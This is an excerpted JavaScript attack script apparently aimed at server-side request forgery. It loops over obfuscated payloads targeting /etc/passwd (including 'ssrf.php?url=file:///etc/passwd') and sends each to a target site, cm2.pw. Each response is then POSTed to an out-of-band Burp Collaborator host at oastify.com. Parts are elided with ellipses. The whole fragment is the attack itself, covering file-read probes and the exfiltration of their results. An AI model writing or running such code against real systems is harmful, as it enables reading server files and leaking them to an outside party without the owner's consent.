// const ports = ["80", "443", "22","8080","21","53","5500"];
const data1 = ["file:$(br)/et$(u)c%252Fpas$(te)swd%3F/",
...
"ssrf.php?url=file:///etc/passwd"
    ...
    data1.forEach(data1 => {
        fetch(`https://cm2.pw/?r=${data1}`)
            .then(response => response.text())
            .then(data => {
                fetch("http://4qvsaj37n739p5mnhvem66iujlpcdg15.oastify.com", {
                    method: "POST",
                    mode: "no-cors",
                    ...
                    body: "data1=" + data1 + "&data=" + encodeURIComponent(data)
                });
            });
    });
